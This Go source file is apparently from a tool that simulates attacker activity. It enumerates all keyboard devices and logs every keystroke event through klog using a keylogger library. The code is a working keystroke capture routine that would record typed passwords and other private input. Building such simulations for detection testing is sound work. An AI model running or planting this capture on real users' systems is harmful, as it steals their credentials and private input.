package simulate

import (
	"fmt"
	"sync"

	"github.com/MarinX/keylogger"
	"k8s.io/klog/v2"
)

func listenKeyboard(kbd string) error {
	klog.Infof("listening on %s", kbd)
	k, err := keylogger.New(kbd)
	if err != nil {
		return fmt.Errorf("keyboard: %w", err)
	}
	defer k.Close()

	events := k.Read()
	for e := range events {
		klog.Infof("event: %+v", e)
	}

	klog.Infof("done listening!")
	return nil
}

func Keylogger() error {
	var wg sync.WaitGroup

	for _, dev := range keylogger.FindAllKeyboardDevices() {
		wg.Add(1)
		go func(d string) {
			defer wg.Done()
			listenKeyboard(d)
		}(dev)
	}

	wg.Wait()
	return nil
}
